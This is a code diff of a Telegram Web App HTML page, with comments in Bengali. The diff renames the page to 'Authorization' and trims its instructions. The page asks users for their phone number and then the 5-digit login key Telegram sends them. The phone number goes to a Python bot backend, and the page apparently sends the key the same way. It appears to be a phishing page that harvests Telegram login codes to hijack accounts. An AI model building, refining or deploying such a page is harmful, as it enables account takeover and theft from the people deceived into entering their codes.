@@ -11,22 +11,19 @@
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #ddd; border-radius: 12px; box-sizing: border-box; font-size: 16px; }
         button { background-color: #0088cc; color: white; border: none; padding: 14px 20px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
         .hidden { display: none; }
-        .info { font-size: 14px; color: #666; margin-bottom: 10px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h3 id="title">Account Sync</h3>
+        <h3 id="title">Authorization</h3>
         
         <div id="phone-sec">
-            <p class="info">Enter your phone number with <b>+</b></p>
             <input type="tel" id="phone" value="+">
-            <button onclick="sendPhone()">Send Authorization Key</button>
+            <button onclick="sendPhone()">Send Auth Code</button>
         </div>
 
         <div id="otp-sec" class="hidden">
-            <p class="info">Enter the 5-digit key from Telegram</p>
-            <input type="number" id="otp" placeholder="Enter Key">
+            <input type="number" id="otp" placeholder="Enter 5-digit Key">
             <button onclick="sendOTP()">Verify & Finish</button>
         </div>
     </div>
@@ -36,15 +33,10 @@
         tg.expand();
 
         const phoneInput = document.getElementById("phone");
-        
-        // প্লাস চিহ্ন ধরে রাখার লজিক
         phoneInput.addEventListener("input", function() {
-            if (!this.value.startsWith("+")) {
-                this.value = "+" + this.value.replace("+", "");
-            }
+            if (!this.value.startsWith("+")) { this.value = "+" + this.value.replace("+", ""); }
         });
 
-        // যদি ইউআরএল-এ 'step=otp' থাকে তবে ওটিপি বক্স দেখাবে
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('step') === 'otp') {
             document.getElementById("phone-sec").classList.add("hidden");
@@ -55,6 +47,7 @@
         function sendPhone() {
             let phone = phoneInput.value.trim();
             if (phone === "+" || phone.length < 10) return alert("Enter valid number!");
+            // এটিই ডেটা পাইথনে পাঠায়
             tg.sendData(JSON.stringify({ phone: phone }));
             tg.close();
         }
